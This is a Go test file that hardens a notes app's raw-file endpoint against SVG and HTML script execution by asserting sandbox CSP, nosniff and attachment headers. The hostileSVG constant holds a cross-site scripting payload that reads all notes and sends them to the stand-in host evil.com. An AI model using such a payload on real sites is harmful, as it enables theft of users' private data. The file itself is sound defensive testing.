package api

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// The SVG that makes this a security issue rather than a content-type nit:
// served from 127.0.0.1:6683, the app's own origin, a top-level navigation to
// it would run this script with full same-origin API access — every note,
// readable and writable.
const hostileSVG = `<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">` +
	`<script>fetch('/api/v1/notes').then(r=>r.text()).then(t=>fetch('//evil.com?d='+t))</script></svg>`

func writeVaultFile(t *testing.T, dataDir, rel string, data []byte) {
	t.Helper()
	abs := filepath.Join(dataDir, "notes", rel)
	if err := os.MkdirAll(filepath.Dir(abs), 0o755); err != nil {
		t.Fatalf("mkdir for %s: %v", rel, err)
	}
	if err := os.WriteFile(abs, data, 0o644); err != nil {
		t.Fatalf("write %s: %v", rel, err)
	}
}

// TestServeFile_SVGIsNotAnActiveDocument pins the raw-file hardening.
//
// Today the only thing stopping this attack is the app-wide CSP's
// script-src 'self'. That is a real mitigation, and also exactly why this is
// worth fixing: the protection is one CSP relaxation away from being gone,
// and such relaxations happen years later for unrelated reasons, by someone
// with no idea that a file-serving path depends on this one.
//
// The assertion is on headers, not on browser behavior: `sandbox` puts the
// response in an opaque origin with scripting disabled when it is loaded as a
// document, which is what removes same-origin API access.
func TestServeFile_SVGIsNotAnActiveDocument(t *testing.T) {
	t.Parallel()
	srv, dataDir := newAttachmentTestServer(t, nil)
	writeVaultFile(t, dataDir, "evil.svg", []byte(hostileSVG))

	rec, body := callServeFile(t, srv, "evil.svg")
	if rec.Code != 200 {
		t.Fatalf("status: got %d, want 200", rec.Code)
	}

	csp := rec.Header().Get("Content-Security-Policy")
	if !strings.Contains(csp, "sandbox") {
		t.Errorf("Content-Security-Policy %q must contain 'sandbox' — without it the SVG runs in the app origin", csp)
	}
	if !strings.Contains(csp, "default-src 'none'") {
		t.Errorf("Content-Security-Policy %q must contain \"default-src 'none'\"", csp)
	}
	if got := rec.Header().Get("X-Content-Type-Options"); got != "nosniff" {
		t.Errorf("X-Content-Type-Options: got %q, want %q", got, "nosniff")
	}

	// Inline rendering must survive: FilePreviewView renders .svg through this
	// same endpoint in an <img>, which needs the image/svg+xml content type.
	if got := rec.Header().Get("Content-Type"); got != "image/svg+xml" {
		t.Errorf("Content-Type: got %q, want %q", got, "image/svg+xml")
	}
	if body != hostileSVG {
		t.Error("response body was altered; the fix must be headers-only")
	}
}

// TestServeFile_InlineMediaStaysInline guards the regression the fix could
// easily cause. Images in notes load through this endpoint, so an
// over-broad Content-Disposition: attachment would break note rendering.
func TestServeFile_InlineMediaStaysInline(t *testing.T) {
	t.Parallel()
	srv, dataDir := newAttachmentTestServer(t, nil)

	for _, tc := range []struct{ rel, wantCTPrefix string }{
		{"photo.png", "image/png"},
		{"scan.jpg", "image/jpeg"},
		{"icon.svg", "image/svg+xml"},
	} {
		writeVaultFile(t, dataDir, tc.rel, pngBytesFor(tc.rel))
		rec, _ := callServeFile(t, srv, tc.rel)

		if rec.Code != 200 {
			t.Errorf("%s: status %d, want 200", tc.rel, rec.Code)
			continue
		}
		if cd := rec.Header().Get("Content-Disposition"); strings.HasPrefix(cd, "attachment") {
			t.Errorf("%s: Content-Disposition %q would stop the note's <img> from rendering", tc.rel, cd)
		}
		if !strings.Contains(rec.Header().Get("Content-Security-Policy"), "sandbox") {
			t.Errorf("%s: missing sandbox CSP", tc.rel)
		}
	}
}

// TestServeFile_NonMediaIsDownloaded: anything outside the inline media
// allowlist is marked as a download, so a planted .html or .xhtml cannot be
// navigated to as a live document in the app origin even if the CSP were
// later weakened.
func TestServeFile_NonMediaIsDownloaded(t *testing.T) {
	t.Parallel()
	srv, dataDir := newAttachmentTestServer(t, nil)

	for _, rel := range []string{"evil.html", "evil.xhtml", "notes.xml", "archive.zip"} {
		writeVaultFile(t, dataDir, rel, []byte("<html><script>alert(1)</script></html>"))
		rec, _ := callServeFile(t, srv, rel)

		if rec.Code != 200 {
			t.Errorf("%s: status %d, want 200", rel, rec.Code)
			continue
		}
		if cd := rec.Header().Get("Content-Disposition"); !strings.HasPrefix(cd, "attachment") {
			t.Errorf("%s: Content-Disposition: got %q, want attachment", rel, cd)
		}
	}
}

// pngBytesFor returns bytes that http.DetectContentType will classify to the
// type implied by rel's extension.
func pngBytesFor(rel string) []byte {
	switch filepath.Ext(rel) {
	case ".png":
		return []byte("\x89PNG\r\n\x1a\nfake")
	case ".jpg", ".jpeg":
		return []byte("\xff\xd8\xff\xe0fake")
	default:
		return []byte(`<svg xmlns="http://www.w3.org/2000/svg"></svg>`)
	}
}
